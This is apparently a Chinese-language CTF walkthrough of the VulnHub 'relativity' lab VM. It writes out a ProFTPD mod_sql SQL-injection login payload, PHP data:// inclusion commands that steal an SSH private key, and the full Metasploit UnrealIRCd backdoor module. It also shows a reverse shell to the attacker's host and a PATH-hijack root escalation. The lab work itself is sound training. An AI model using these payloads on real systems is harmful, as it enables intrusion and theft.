# /dev/random: relativity (v1.0.1)

项目地址：https://download.vulnhub.com/devrandom/relativity_1.0.1.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/697b3a29bb08ad63f9c7a7e0.png)

80 端口是静态页面，只有一张图片

![](https://pic1.imgdb.cn/item/697b3a48bb08ad63f9c7a7e3.png)

观察到 banner 有一个 `mod_sql`

![](https://pic1.imgdb.cn/item/697b3a66681ba7926cd9ed85.png)

`mod_sql` 是 ProFTPD 用于支持数据库后端验证的一个知名模块

明确使用了 SQL 模块，说明该 FTP 的账号密码并不是存储在 `/etc/shadow` 等系统文件中，而是存储在后端的数据库（如 MySQL、PostgreSQL）中

继续让 AI 吐出历史 CVE

![](https://pic1.imgdb.cn/item/697b796a681ba7926cdab197.png)

## SQL

### mod_sql（CVE-2009-0542）

在 Exploit DB 中搜索到历史 POC

![](https://pic1.imgdb.cn/item/697b7a3b681ba7926cdab1af.png)

```sql
# 测试发现需要将结尾的注释符 -- 替换成 #
USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; #
```

账号输入上面的 Payload，密码则按照 POC 的描述输入 1

成功登录进去

![](https://pic1.imgdb.cn/item/697b7942681ba7926cdab194.png)

## LFI

### page

发现网站下有个隐藏文件

![](https://pic1.imgdb.cn/item/697b7bc9681ba7926cdab7cf.png)

从 Web 访问这个目录多了一个页面

![](https://pic1.imgdb.cn/item/697b8140681ba7926cdadef7.png)

几个页面点着看发现 URL 参数中的 `page` 一直在变化，且值是文件名

![](https://pic1.imgdb.cn/item/697b82b3681ba7926cdae8d2.png)

尝试任意文件读取不行

![](https://pic1.imgdb.cn/item/697b8298681ba7926cdae825.png)

再尝试下通过 `data` 伪协议打本地文件包含

```php
data://text/plain, <?php system("whoami");?>
```

![](https://pic1.imgdb.cn/item/697b83a2681ba7926cdaecd5.png)

## 弱口令

### SSH

查看 `etc/passwd` 文件内容发现有两个普通用户

```php
?page=data://text/plain,%20<?php%20system("cat%20/etc/passwd");?>
```

![](https://pic1.imgdb.cn/item/697b84d6681ba7926cdb19bb.png)

发现 `mauk` 用户有读权限

```php
?page=data://text/plain,%20<?php%20system("ls%20-l%20/home");?>
```

![](https://pic1.imgdb.cn/item/697b8537681ba7926cdb19bd.png)

加上 `-a` 参数查看有哪些文件

```php
?page=data://text/plain,%20<?php%20system("ls%20-la%20/home/mauk");?>
```

![](https://pic1.imgdb.cn/item/697b8648681ba7926cdb19cf.png)

发现有 `.ssh` 文件夹，进去看看

```php
?page=data://text/plain,%20<?php%20system("ls%20-la%20/home/mauk/.ssh");?>
```

![](https://pic1.imgdb.cn/item/697b86a1681ba7926cdb19d1.png)

居然有私钥，窃取出来远程连接

```php
?page=data://text/plain,%20<?php%20system("cat%20/home/mauk/.ssh/id_rsa");?>
```

![](https://pic1.imgdb.cn/item/697b8700681ba7926cdb19e0.png)

让 AI 格式化下

![](https://pic1.imgdb.cn/item/697b87db681ba7926cdb19eb.png)

修改权限后成功连接上用户 `mauk`

![](https://pic1.imgdb.cn/item/697b88bc681ba7926cdb19f5.png)

## 内网穿透

### SSH 转发

登录上来发现没权限没 `wget` 命令，只能找找别的一些文件看有没有作用了

做信息收集发现该用户 `.bash_history` 文件有内容，于是查看

![](https://pic1.imgdb.cn/item/697b8a26681ba7926cdb1a1c.png)

```
ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
```

**`-f` 参数**

- 作用：让 SSH 在认证完成后转到后台运行

**`-R 6667:127.0.0.1:6667` 参数**

- `-R`：建立远程端口转发
- 格式：`-R [远程主机:]远程端口:本地主机:本地端口`
- 具体含义：
  - 完整解释：将远程服务器（192.168.144.228）的 6667 端口转发到本地机器的 6667 端口

**`-N` 参数**

- 作用：不执行远程命令
- 效果：只建立隧道连接，不打开远程 shell 会话

![](https://pic1.imgdb.cn/item/697b8b7d681ba7926cdb1a37.png)

跟着 AI 的结果去排查，首先第一个就可以排除，因为只有一台靶机

那么接下来来看第二个，看看有没有这个端口

```bash
netstat -ano
```

![](https://pic1.imgdb.cn/item/697b8bea681ba7926cdb1a39.png)

真有 6667 端口

6667 端口是 **IRC** 服务的标准端口，IRC 是一种古老的、基于文本的实时聊天协议

看看 AI 的渗透思路

![](https://pic1.imgdb.cn/item/697b96b6681ba7926cdb2529.png)

那么接下来就用 SSH 做端口转发

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i /tmp/.ssh/id_rsa -L 6667:127.0.0.1:6667 mauk@192.168.202.162
```

![](https://pic1.imgdb.cn/item/697b9747681ba7926cdb252e.png)

## RCE

### UnrealIRCd（CVE-2010-2075）

使用 nmap 扫描转发到本地的 6667 端口，看看什么版本

![](https://pic1.imgdb.cn/item/697b97c6681ba7926cdb2532.png)

搜索这个服务名 `UnrealIRCD` 只有一个 Payload 能打，但是失败了

![](https://pic1.imgdb.cn/item/697b994d681ba7926cdb2541.png)

翻找源码

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'UnrealIRCD 3.2.8.1 Backdoor Command Execution',
        'Description' => %q{
          This module exploits a malicious backdoor that was added to the
          Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the
          Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.
        },
        'Author' => [ 'hdm' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2010-2075' ],
          [ 'OSVDB', '65445' ],
          [ 'URL', 'http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt' ]
        ],
        'Platform' => ['unix'],
        'Arch' => ARCH_CMD,
        'Privileged' => false,
        'Payload' => {
          'Space' => 1024,
          'DisableNops' => true,
          'Compat' =>
                        {
                          'PayloadType' => 'cmd',
                          'RequiredCmd' => 'generic perl ruby telnet',
                        }
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2010-06-12',
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        Opt::RPORT(6667)
      ]
    )
  end

  def exploit
    connect

    print_status("Connected to #{rhost}:#{rport}...")
    banner = sock.get_once(-1, 30)
    banner.to_s.split("\n").each do |line|
      print_line("    #{line}")
    end

    print_status("Sending backdoor command...")
    sock.put("AB;" + payload.encoded + "\n")

    # Wait for the request to be handled
    1.upto(120) do
      break if session_created?

      select(nil, nil, nil, 0.25)
      handler()
    end
    disconnect
  end
end
```

在 2009 年 11 月到 2010 年 6 月期间，UnrealIRCd 的官方镜像站点被黑客入侵，源码包（`Unreal3.2.8.1.tar.gz`）被替换。黑客在核心代码 `s_serv.c` 中加入了一段看似不起眼但极其致命的代码：

> **逻辑伪代码：** 如果接收到的字符串前两个字符是 `AB`，则跳过 IRC 协议解析，直接调用 `system()` 函数执行其后的命令

所以我们尝试手动复现

```bash
# 尝试在目标机 /tmp 目录下创建一个探测文件
echo "AB; touch /tmp/pwned_by_interview" | nc -vn 127.0.0.1 6667
```

![](https://pic1.imgdb.cn/item/697b984e681ba7926cdb2533.png)

成功

![](https://pic1.imgdb.cn/item/697b9861681ba7926cdb253d.png)

直接反弹 Shell

```bash
echo "AB; bash -i >& /dev/tcp/192.168.202.128/9999 0>&1" | nc -vn 127.0.0.1 6667
```

![](https://pic1.imgdb.cn/item/697b9bef681ba7926cdb254f.png)

![](https://pic1.imgdb.cn/item/697b9c42681ba7926cdb2552.png)

## 提权

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://pic1.imgdb.cn/item/697b9cef681ba7926cdb2554.png)

### 环境变量劫持

按照上面给的提示，我们可以以 `root` 身份无需密码运行这个程序

![](https://pic1.imgdb.cn/item/697b9d86681ba7926cdb2557.png)

报错 `error: (12)` 也并没有提权成功，检查一下字符串

```bash
strings auth_server
```

![](https://pic1.imgdb.cn/item/697b9f0f681ba7926cdb2563.png)

这里有个关键内容，扔给 AI 也可以直接出

```
fortune -s | /usr/bin/cowsay
```

1. **`fortune -s`**
   - `fortune`：显示随机名言/格言/笑话的程序
   - `-s` 参数：short 模式，只显示简短的名言
2. **`|`**：管道符号，将前一个命令的输出作为后一个命令的输入
3. **`/usr/bin/cowsay`**
   - `cowsay`：将一个 ASCII 艺术牛说话的程序
   - `/usr/bin/`：命令的完整路径

`cowsay` 使用了**绝对路径** (`/usr/bin/cowsay`)，这很难利用

但 `fortune` **没有使用绝对路径**

既然 `auth_server` 可以通过 `sudo` 运行，且它在调用 `fortune` 时是去系统的 `$PATH` 中搜索该程序

那么，如果我们能伪造一个“恶意的” `fortune` 命令并让程序先找到它，我们就能获得 root 权限

```bash
# 准备程序
echo '/bin/bash -p' > /tmp/fortune
chmod +x /tmp/fortune

# 劫持 PATH 环境变量： 将 /tmp 目录加入到 $PATH 的最前面
export PATH=/tmp:$PATH
```

由于我们修改了 `$PATH`，系统会优先在 `/tmp` 下找到我们的恶意 `fortune` 并以 root 权限执行

![](https://pic1.imgdb.cn/item/697ba0c0681ba7926cdb3340.png)